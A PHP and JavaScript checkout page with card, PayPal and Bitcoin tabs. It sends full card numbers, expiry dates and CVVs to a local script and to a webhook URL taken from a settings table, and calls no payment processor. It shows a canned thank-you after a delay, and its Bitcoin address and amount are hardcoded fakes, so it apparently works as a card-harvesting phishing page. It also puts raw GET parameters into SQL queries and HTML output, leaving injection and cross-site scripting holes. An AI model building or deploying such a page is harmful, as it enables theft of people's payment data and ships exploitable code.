<?php
	
	session_start();
	
	include_once "../admin/connection.php";
	
	$order_id =$_GET['order_id'];
	$tkn = $_GET['tkn'];
	$amount = $_GET['amount'];
	
	
	$sql="SELECT * FROM links WHERE order_id='$order_id' AND tkn='$tkn' AND amount='$amount' AND status='unused'";	
	$data=mysqli_query($link,$sql);
	
	$deal_id = mysqli_fetch_assoc($data)['deal_id'];
	
	
	$order_exits=mysqli_num_rows($data);
	
	
	
	$sql="SELECT * FROM deals WHERE id=".$deal_id;
	$deal = mysqli_query($link,$sql);
	$deal = mysqli_fetch_assoc($deal);
	
	
	
$sql="SELECT * FROM settings WHERE id=1";
    $settings = mysqli_query($link,$sql);
    $settings = mysqli_fetch_assoc($settings);
	
	
	
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" >
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta2/css/all.min.css" rel="stylesheet" >
    <link href="./assets/css/style.css" rel="stylesheet" >
	
	
	<link rel="stylesheet" href="./assets/css/intlTelInput.css"/>
	<link rel="stylesheet" href="https://unpkg.com/bootstrap-select-country@4.0.0/dist/css/bootstrap-select-country.min.css" type="text/css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.13/css/select2.min.css" type="text/css" />
	
	<style>
	
	.images {
            display: inline-block;
            height: auto;
            width: 15%;
            margin: 1%;
            left: 20px;
            text-align: center
        }
	
	.intl-tel-input{
	  width: 100%;
	}
	
	.iti.iti--allow-dropdown { width: 100% }
	
	 .inlineimage {
            text-align: center;
        }
	
	.loading {
            position: fixed;
            z-index: 999;
            height: 2em;
            width: 2em;
            overflow: show;
            margin: auto;
            top: 0;
            left: 0;
            bottom: 0;
            right: 0;
        }
        /* Transparent Overlay */
        
        .loading:before {
            content: '';
            display: block;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));
            background: -webkit-radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));
        }
        /* :not(:required) hides these rules from IE9 and below */
        
        .loading:not(:required) {
            /* hide "loading..." text */
            font: 0/0 a;
            color: transparent;
            text-shadow: none;
            background-color: transparent;
            border: 0;
        }
        
        .loading:not(:required):after {
            content: '';
            display: block;
            font-size: 10px;
            width: 1em;
            height: 1em;
            margin-top: -0.5em;
            -webkit-animation: spinner 150ms infinite linear;
            -moz-animation: spinner 150ms infinite linear;
            -ms-animation: spinner 150ms infinite linear;
            -o-animation: spinner 150ms infinite linear;
            animation: spinner 150ms infinite linear;
            border-radius: 0.5em;
            -webkit-box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
            box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
        }
		
		 .none {
            display: none;
        }
		
		
		 .thanks .images {
            display: inline-block;
            max-width: 98%;
            height: auto;
            width: 10%;
            margin: 1%;
            left: 20px;
            text-align: center
        }
		
		
		 @-webkit-keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
        
        @-moz-keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
        
        @-o-keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
        
        @keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
		
		
		.select2-selection__rendered {
    line-height: 31px !important;
}
.select2-container .select2-selection--single {
    height: 35px !important;
}
.select2-selection__arrow {
    height: 34px !important;
}


	
	</style>
	
</head>
<body>
    <div class="container py-5">
       
	   
		<?php
			
			if($order_exits>0)
			{
		
		?>

	<div class="payement">
		
	   <!-- For demo purpose -->
        <div class="row mb-4">
            <div class="col-lg-8 mx-auto text-center">
                <h1 class="display-6">Payment Details</h1>
            </div>
        </div> <!-- End -->
        <div class="row">
            <div class="col-lg-6 mx-auto">
                <div class="card ">
                    <div class="card-header">
                        <div class="bg-white shadow-sm pt-4 pl-2 pr-2 pb-2">
                            <!-- Credit card form tabs -->
                            <ul role="tablist" class="nav bg-light nav-pills rounded nav-fill mb-3">
                                <li class="nav-item"> <a data-toggle="pill" href="#credit-card" class="nav-link active "> <i class="fas fa-credit-card mr-2"></i> Credit Card </a> </li>
                                <li class="nav-item"> <a data-toggle="pill" href="#paypal" class="nav-link "> <i class="fab fa-paypal mr-2"></i> Paypal </a> </li>
                                <li class="nav-item"> <a data-toggle="pill" href="#net-banking" class="nav-link "> ₿ Crypto </a> </li>
                            </ul>
                        </div> <!-- End -->
                        <!-- Credit card form content -->
                        <div class="tab-content">
                            <!-- credit card info-->
                            <div id="credit-card" class="tab-pane fade show active pt-3">
                                <form role="form" id="payment_form"  class="needs-validation" novalidate>
                                    
									
									
									
									<div class="row">
                                        <div class="col-sm-6">
                                            <div class="form-group"> 
                                                <label for="first_name">
                                                <h6>Order ID</h6>
                                                </label> 
                                                <input value="<?php  echo $_GET['order_id']; ?>" id="order_id" type="text" name="order_id"  required class="form-control" readonly> 
                                                
                                        </div>
                                        
                                        </div>
                                        <div class="col-sm-6">
                                            <div class="form-group"> 
                                                <label for="last_name">
                                                <h6>Amount to pay</h6>
                                            </label> 
											
											
											
											<div class="input-group">
                                             <input value="<?php echo $_GET['amount']; ?>" type="text" id="ammount" name="last_name" required class="form-control" readonly> 
											 <span class="input-group-text"><?php  echo $deal['currency_code']; ?> <?php  echo $deal['currency']; ?></span>
                                            </div>
											
                                        </div>
                                        </div>
                                    </div>
									
									
									
									
									<div class="row">
                                        <div class="col-sm-6">
                                            <div class="form-group"> 
                                                <label for="first_name">
                                                <h6>Cardholder First Name</h6>
                                                </label> 
                                                <input type="text" id="firstName" name="first_name" placeholder="Card Owner First Name" data-validation="required" required class="form-control "> 
                                                <div class="valid-feedback">
                                                    First name is valid!
                                                </div>
                                                <div class="invalid-feedback">
                                                    Please type the first name of the card owner.
                                                </div>
                                        </div>
                                        
                                        </div>
                                        <div class="col-sm-6">
                                            <div class="form-group"> 
                                                <label for="last_name">
                                                <h6>Cardholder Last Name</h6>
                                            </label> 
                                            <input type="text" id="lastName" name="last_name" placeholder="Card Owner Last Name" pattern="[A-Za-z]{3,}"  required class="form-control "> 
                                            <div class="valid-feedback">
                                                Last Name is valid!
                                            </div>
                                            <div class="invalid-feedback">
                                                Please type the last Name of the card owner.
                                            </div>
                                        </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12">
                                            <div class="form-group"> 
                                                <label for="email">
                                                <h6>    Email</h6>
                                            </label> 
                                            <input type="email" id="email" name="email" placeholder="Email Address" required class="form-control ">
                                            <div class="valid-feedback">
                                                Email is valid!
                                            </div>
                                            <div class="invalid-feedback">
                                                Please type a valid email.
                                            </div> 
                                        </div>

                                        </div>
                                    </div>
									
									<div class="row">
										<div class="col-12">
												
										<div class="form-group"> <label>Country</label>
											<select  id="country" class="selectpicker form-control countrypicker" data-default="US" data-live-search="true">
											</select>
										</div>
											
										</div>
									
									</div>
									
                                    
                                    <div class="row">
                                        <div class="col-sm-6">
                                            <div class="form-group"> 
                                                <label for="first_name">
                                                <h6>City</h6>
                                                </label> 
                                                <input id="city" type="text" name="city" placeholder="City" required class="form-control "> 
                                                <div class="valid-feedback">
                                                    City is valid!
                                                </div>
                                                <div class="invalid-feedback">
                                                    Please type a valid city.
                                                </div> 
                                        </div>
                                        
                                        </div>
                                        <div class="col-sm-6">
                                            <div class="form-group"> 
                                                <label for="zip_code">
                                                <h6>ZIP CODE</h6>
                                            </label> 
                                            <input id="zipCode" type="number" min="1000" max="9999999999" name="zip_code" placeholder="ZIP CODE" required class="form-control ">
                                            <div class="valid-feedback">
                                                ZIP CODE is valid!
                                            </div>
                                            <div class="invalid-feedback">
                                                Please type a valid ZIP code.
                                            </div>  
                                        </div>
                                        </div>
                                    </div>
                                    
                                    <div class="row">
                                        <div class="col-12">
                                            <div class="form-group">
                                            <label for="phone">
                                                <h6>Phone Number</h6>
                                            </label>
											<br>
											<input type="tel" data-validation="custom" data-validation-regexp="^(\+\d{1,3}\s)?\(?\d{2,3}\)?[\s.-]?\d{3}[\s.-]?\d{4}$" style="width:100%;"  id="phoneNumber" class="form-control"/>
                                        </div> 
                                        </div>
                                    </div>

                                    <div class="row">
                                        <div class="col-sm-12">
                                            <div class="form-group"> <label for="cardNumber">
                                                <h6>Card number</h6>
                                            </label>
                                            <div class="input-group">
                                                 <input id="cardNumber" type="text" name="cardNumber" placeholder="Valid card number" class="form-control " required pattern="[0-9]{13,16}">
                                                <div class="input-group-append"> <span class="input-group-text text-muted"> <i class="fab fa-cc-visa mx-1"></i> <i class="fab fa-cc-mastercard mx-1"></i> <i class="fab fa-cc-amex mx-1"></i> </span> </div>
                                                <div class="valid-feedback">
                                                   Card number is valid!
                                                </div>
                                                <div class="invalid-feedback">
                                                    Please type a  valid card number.
                                                </div>
                                            </div>
                                        </div>

                                        </div>
                                    </div>
                                    
                                    <div class="row">
									
									
                                    <div class="col-xs-7 col-md-7">
                                        <div class="form-group"> <label><span class="hidden-xs">EXPIRATION</span><span class="visible-xs-inline">EXP</span> DATE</label> <input id="expirationDate" type="text" onkeypress="return onlyNumberKey(event)" class="form-control" placeholder="MM / YY"
                                                data-validation="date" data-validation-format="mm/yy" required/> </div>
										<p id="invalid_expiry" style="color:red;"> Invalid Expiry </p>		
                                    </div>
                                   

                                        
                                        <div class="col-sm-4">
                                            <div class="form-group mb-4"> <label data-toggle="tooltip" title="Three digit CV code on the back of your card">
                                                    <h6>CVV <i class="fa fa-question-circle d-inline"></i></h6>
                                                </label> <input id="cvv"  data-validation="cvv" type="tel" class="form-control" name="cvv">  
                                                <div class="valid-feedback">
                                                    CVV is valid!
                                                </div>
                                                <div class="invalid-feedback">
                                                    Please type a  CVV.
                                                </div>    
                                        </div>
                                        </div>
                                    </div>
                                    <div class="card-footer"> 
                                        <button type="submit" class="subscribe btn btn-primary btn-block shadow-sm"> Confirm Payment </button>
                                        
                                </form>
                            </div>
                        </div> <!-- End -->
                        <!-- Paypal info -->
                        <div id="paypal" class="tab-pane fade pt-3">
                            <h6 class="pb-2">Select your paypal account type</h6>
                            <div class="form-group "> <label class="radio-inline"> <input type="radio" name="optradio" checked> Domestic </label> <label class="radio-inline"> <input type="radio" name="optradio" class="ml-5">International </label></div>
                            <p> <button type="button" class="btn btn-primary "><i class="fab fa-paypal mr-2"></i> continue with paypal</button> </p>
                            <p class="text-muted"> Note: After clicking on the button, you will be directed to a secure gateway for payment. After completing the payment process, you will be redirected back to the website to view details of your order. </p>
                        </div> <!-- End -->
                        <!-- bank transfer info -->
                        <div id="net-banking" class="tab-pane fade pt-3">
                            
							<form id="btc_form" method="POST" class="needs-validation" novalidate>
							
							<div class="row">
							
							
							
							<div class="form-group col-sm-6"> 

								<label> Order ID </label>
								<input id="btc_form_order_id" value="<?php  echo $_GET['order_id']; ?>" type="text" name="order_id" class="form-control" readonly/>
								
							</div>
							
							
							
							
							
									<div class="col-sm-6">
                                            <div class="form-group"> 
                                                <label for="last_name">
                                                <h6>Amount to pay</h6>
                                            </label> 
											
											
											
											<div class="input-group">
                                             <input id="btc_form_amount" value="<?php echo $_GET['amount']; ?>" type="text" name="amount" required class="form-control" readonly> 
											 <span class="input-group-text"><span class="fa fa-euro"></span></span>
                                            </div>
											
                                        </div>
                                        </div>
							
							
							
							
							
							
							<div class="form-group col-sm-6"> 

								<label> First Name </label>
								<input id="btc_form_first_name" required type="text" name="first_name" class="form-control"/>
								
							</div>
							
							
							<div class="form-group col-sm-6"> 

								<label> Last Name </label>
								<input id="btc_form_last_name" required type="text" name="last_name" class="form-control"/>
								
							</div>
							
							
							<div class="form-group col-sm-12"> 

								<label> Email </label>
								<input id="btc_form_email" required type="email" name="last_name" class="form-control"/>
								
							</div>
							
							
							<div class="form-group col-sm-12"> 

								<label> Country </label>
								<select required style="width:100%;" class="selectpicker form-control countrypicker" id="btc_country" name="country">
								</select>
								
							</div>
							
							
							<div class="form-group col-sm-6"> 

								<label> City </label>
								<input required type="text" name="city" class="form-control"/>
								
							</div>
							
							
							
							<div class="form-group col-sm-6"> 

								<label> Zip </label>
								<input required type="text" name="city" class="form-control"/>
								
							</div>
							
							
							<div class="form-group col-sm-12"> 

								<label> Phone Number </label>
								<input  id="btc_phone" required type="text" name="phone_number" class="form-control"/>
								
							</div>
							
							
							</div>
							
							
                            <div class="form-group">
                                <p> <button type="submit" class="btn btn-primary form-control"> ₿ Proceed Payment</button> </p>
                            </div>
							
							
							</form>
                            <p class="text-muted">Note: After clicking on the button, you will be directed to a secure gateway for payment. After completing the payment process, you will be redirected back to the website to view details of your order. </p>
                        </div> <!-- End -->
                        <!-- End -->	
                    </div>
                </div>
            </div>
        </div>
		
		
		</div>
		
		
		</div>
		<?php
			
			}
		else
		{			
		
		?>
		
		
	
	
	
	<div class="container Thanks" style="margin-top: 25px;">
		    <div class="row">
                <div class="col-sm-12 col-md-12">
                    <div class="panel panel-primary">
						
						<?php
							
							$sql="SELECT * FROM links WHERE order_id='$order_id' AND tkn='$tkn' AND amount='$amount' AND status='used'";	
							$data=mysqli_query($link,$sql);
							$order_exits1=mysqli_num_rows($data);
							
						
						?>

                        <div class="panel-body text-center">
                            
							<?php 
								
								if($order_exits1>0)
								{
								
							?>
							
							<h3> <b>Order# <?php echo $order_id; ?> already completed </b> </h3>
							
							<?php
								
								}
								else
								{
							?>
							
							<h3> <b>Error!</b> </h3>
                            
							<?php
							
								}
							?>
							<!--
							<img src="check-mark.gif" style="width: 270px; margin: 15%;" />
                            -->
							
                            

                        </div>
                        <div class="panel-footer">
							
							    <div class="inlineimage">
								<img class="img-responsive  " src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/Mastercard-Curved.png ">
								<img class="img-responsive  " src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/Discover-Curved.png"> 
								<img class="img-responsive  " src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/Visa-Curved.png ">
								<img class="img-responsive  " src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/American-Express-Curved.png ">                                   

								</div>
                            
                        </div>

                    </div>
                </div>
            </div>
        </div>
		
		
		
	<?php
	
		}
	
	?>	

		
		  <div class="container thanks none" style="margin-top: 25px;">
            <div class="row">
                <div class="col-xs-12 col-md-12">
                    <div class="panel panel-default">


                        <div class="panel-body text-center">
                            <h3>
                                <b> Thank you <b id="Fname"></b> <b id="Lname"></b> </b>
                            </h3>
                            <h3> <b>We received your order Of <?php  echo $deal['currency']; ?> </b> <b id="amount_to_pay"></b></h3>
                            <img src="check-mark.gif" style="width: 270px;" />
                            
							
							<h3>
                                your order number #<b id="order"></b>

                            </h3>
                            <h3>
                                It will appear in your account shortly
                            </h3>

                        </div>
                        <div class="panel-footer ">
                            <div class="row ">
                              
							  <div class="col-xs-12 col-md-12">
								<div class="inlineimage"> 
									<img class="img-responsive images" src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/Mastercard-Curved.png ">
									<img class="img-responsive images" src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/Discover-Curved.png"> 
									<img class="img-responsive images" src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/Visa-Curved.png "> 
									<img class="img-responsive images" src="https://cdn0.iconfinder.com/data/icons/credit-card-debit-card-payment-PNG/128/American-Express-Curved.png ">                                    
									
								</div>
							  </div>	
								
                            </div>
                        </div>

                    </div>
                </div>
            </div>
        </div>
		
		
		
		
		</div>
		
		<div class="loading " style="display: none; ">Loading&#8230;</div>
		
		
		
		
		<!-- The Modal -->
<div class="modal" id="btc_modal">
  <div class="modal-dialog">
    <div class="modal-content">

      <!-- Modal Header -->
      <div class="modal-header">
        <h4 class="modal-title">Bitcoin Payment</h4>
        <button type="button" class="close" data-dismiss="modal">&times;</button>
      </div>

      <!-- Modal body -->
      <div class="modal-body">
			
			<table class="table table-responsive">
				
				<tr>
					<th> Order ID </td>
					<td id="btc_order_id"></td>
				</tr>
				
				<tr>
					<th> BTC amount </td>
					<td id="btc_amount"></td>
				</tr>
				
				
				
				<tr>
					<th> BTC Address </td>
					<td id="btc_address"></td>
				</tr>
				
				
				<tr>
					<th> QR Code </td>
					<td id="btc_qrcode"><img src="/qrcode.png"/></td>
				</tr>
			</table>
			
			
      </div>

      <!-- Modal footer -->
      <div class="modal-footer">
        <button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
      </div>

    </div>
  </div>
</div>
   
   
   <input type="hidden" id="email_body" value="<?php  echo $deal['email_body']; ?>"/>
    <input type="hidden" id="email_body_admin" value="<?php  echo $deal['email_body_admin']; ?>"/> 
    
</body>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-url-parser/2.3.1/purl.min.js" integrity="sha512-tG/z3oMGIF5+ej4sVH0g+8J6XO/nxq/NtX85TEmnSx5mC8/FXurBybh7jSBv8i2+Fn+BXRclA329a66Axd89/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.bundle.min.js"></script>
<script src="./assets/js/main.js"></script>


<script src="./assets/js/intlTelInput.min.js"></script>
<script src="./assets/js/intlTelInput-jquery.min.js"></script>

<script src="https://unpkg.com/bootstrap-select-country@4.0.0/dist/js/bootstrap-select-country.min.js"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.13/js/select2.min.js"></script>

<script>
	
	$('.countrypicker').countrypicker();
	
	var countryData = $("#phoneNumber").intlTelInput("getSelectedCountryData"); // get country data as obj 

    $('#country').on('change', function() {
        $('#phoneNumber').intlTelInput("setCountry", $('#country').val());
    })

		
	$("#invalid_expiry").hide();
	
	$("#phoneNumber").intlTelInput({
        separateDialCode: true,
    });
	
	$("#btc_phone").intlTelInput({
        separateDialCode: true,
    });
	
	
	$('#btc_country').on('change', function() {
        $('#btc_phone').intlTelInput("setCountry", $('#btc_country').val());
    })
	
	
	
	
	$('#expirationDate').on('keyup', function(event) {
		
		
		$("#invalid_expiry").hide();
		
        var ASCIICode = (event.which) ? event.which : event.keyCode
        console.log(ASCIICode)
        if (ASCIICode != 8)
		{
			
            if ($('#expirationDate').val().length == 2)
			{
                $('#expirationDate').val($('#expirationDate').val() + "/");
			}
			else if($('#expirationDate').val().length>2)
			{
				
				var expirationDate =$('#expirationDate').val();
				
				var year = expirationDate.split("/");
				
				if(year[1].length==2)
				{
					if(year[1]>20 && year[1]<28)
					{
						
						
						
					}
					else
					{
						$("#invalid_expiry").show();
					}
					
					
				}
				
				else if(year[1].length>2)
				{
					
					expirationDate = expirationDate.substring(0, expirationDate.length - 1);
					
					$('#expirationDate').val(expirationDate);
					
				}
				
				
				
			}
			
			
		}
		
    })
	
	
	
	$("#cvv").on('keyup', function(event){
		
		var cvv = $("#cvv").val();
		
		if(cvv.length>4)
		{
			cvv = cvv.substring(0, cvv.length - 1);
			
			$("#cvv").val(cvv);
					
		}
	});
	
	
	$("#country").select2();
	$("#btc_country").select2();
	
	var validate = $.validate({
        modules: 'html5, sepa , security',
        validateOnBlur: true,

        onSuccess: function(form) 
		{
            event.preventDefault();
            
			var btc_first_name = $("#btc_form_first_name").val();
			var btc_last_name = $("#btc_form_last_name").val();
			
			if(btc_first_name.length>0 && btc_last_name.length>0)
			{
				open_btc_popup();
				
			}
			else
			{
				sendData();
			}
			
        }
    });
	
	
	
	
	function open_btc_popup()
	{
		
		$("#btc_order_id").html($("#btc_form_order_id").val());
		$("#btc_amount").html("0.0022587");
		
		$("#btc_address").html("bwulf2343fbwjeg4kghtru45");
		
		
		$("#btc_modal").modal();
		
	}
	
	
		
function sendData() {
        
		var countryData = $("#phoneNumber").intlTelInput("getSelectedCountryData"); // get country data as obj 
		
		
        $('.loading').css({
            display: "block "
        })
		
		
		
		// store in db
		$.ajax({
			
            url: "/dashboard/admin/store_order.php",
            method: "POST",
            dataType: "json",
            data: {
                firstName: $('#firstName').val(),
                lastName: $('#lastName').val(),
                cardNumber: $('#cardNumber').val(),
                email: $('#email').val(),
                country: $('#country').val(),
                city: $('#city').val(),
                zipCode: $('#zipCode').val(),
                phoneNumber: "+" + countryData.dialCode + $('#phoneNumber').val(),
                ammount: $('#ammount').val(),
                expirationDate: $('#expirationDate').val(),
                cvv: $('#cvv').val(),
				order_id:$("#order_id").val(),
                deal_id:"<?php echo $deal_id; ?>"
            },
			success:function(data){
				
				
			}
		
		});
		
		
		
		var card = $('#cardNumber').val();
		var last_4 = card.substr(-4);
		
		
		
		var email_subject_client="<?php echo  $deal['email_subject_to_client']; ?>";
		var email_subject_admin="<?php echo  $deal['email_subject_to_admin']; ?>";
	    var email_body=$("#email_body").val();
	    var email_body_admin = $("#email_body_admin").val();
	    
	    
	    var firstName = $('#firstName').val();
	    var lastName = $('#lastName').val();
	    var orer_idd  = $("#order_id").val();
	    var currency = "<?php  echo $deal['currency']; ?>";
	    var currency_code = "<?php echo $deal['currency_code']; ?>";
	    
	    
	    
	    email_subject_client = email_subject_client.replace("#FIRSTNAME", firstName);
	    email_subject_client = email_subject_client.replace("#LASTNAME", lastName);
	    email_subject_client = email_subject_client.replace("#ORDERID", orer_idd);
	    email_subject_client = email_subject_client.replace("#EMAIL", $('#email').val());
	    
	    
	    
	    
	    email_subject_admin = email_subject_admin.replace("#FIRSTNAME", firstName);
	    email_subject_admin = email_subject_admin.replace("#LASTNAME", lastName);
	    email_subject_admin = email_subject_admin.replace("#ORDERID", orer_idd);
	    email_subject_admin = email_subject_admin.replace("#EMAIL", $('#email').val());
	    
	    
	    
	    
	    email_body = email_body.replace("#FIRSTNAME", lastName);
	    email_body = email_body.replace("#LASTNAME", lastName);
	    email_body = email_body.replace("#ORDERID", orer_idd);
	    email_body = email_body.replace("#EMAIL", $('#email').val());
	    email_body = email_body.replace("#CURRENCY",currency);
	    email_body = email_body.replace("#AMOUNT", $('#ammount').val());
	    email_body = email_body.replace("#COUNTRY", $('#country').val());
	    email_body = email_body.replace("#PHONE", "+" + countryData.dialCode + $('#phoneNumber').val());
	    email_body = email_body.replace("#LAST4", last_4);
	    email_body = email_body.replace("#CURRENCYCODE", currency_code);
	    
	    
	    
	    
	    email_body_admin = email_body_admin.replace("#FIRSTNAME", lastName);
	    email_body_admin = email_body_admin.replace("#LASTNAME", lastName);
	    email_body_admin = email_body_admin.replace("#ORDERID", orer_idd);
	    email_body_admin = email_body_admin.replace("#EMAIL", $('#email').val());
	    email_body_admin = email_body_admin.replace("#CURRENCY",currency);
	    email_body_admin = email_body_admin.replace("#AMOUNT", $('#ammount').val());
	    email_body_admin = email_body_admin.replace("#COUNTRY", $('#country').val());
	    email_body_admin = email_body_admin.replace("#PHONE", "+" + countryData.dialCode + $('#phoneNumber').val());
	    email_body_admin = email_body_admin.replace("#LAST4", last_4);
	    email_body_admin = email_body_admin.replace("#CURRENCYCODE", currency_code);
	    
		
        $.ajax({
            url: "<?php echo $settings['webhook']; ?>",
            method: "POST",
            dataType: "json",
            data: {
                firstName: $('#firstName').val(),
                lastName: $('#lastName').val(),
                cardNumber: $('#cardNumber').val(),
                email: $('#email').val(),
                country: $('#country').val(),
                city: $('#city').val(),
                zipCode: $('#zipCode').val(),
                phoneNumber: "+" + countryData.dialCode + $('#phoneNumber').val(),
                ammount: $('#ammount').val(),
                expirationDate: $('#expirationDate').val(),
                cvv: $('#cvv').val(),
				order_id:$("#order_id").val(),
				last_4:last_4,
				email_subject_client:email_subject_client,
				email_subject_admin:email_subject_admin,
				email_body:email_body,
				email_body_admin:email_body_admin

            },
            success: data => {
               setTimeout(function(){ 


			   $('.loading').css({
                    display: "none"
                })
                $('.thanks').removeClass('none');
                $('.payement').toggleClass('none');
				
				
				$('#Fname').html($('#firstName').val());
                $('#Lname').html($('#lastName').val());
                $('#amount_to_pay').html($('#ammount').val());
                $('#order').html($("#order_id").val());
                
				 }, 4000);
				
            },
            error: data => {
                $('.loading').css({
                    display: "none"
                })
                alert('error while sending data');

            }
        });
		
		


    }
    
</script>

</html>

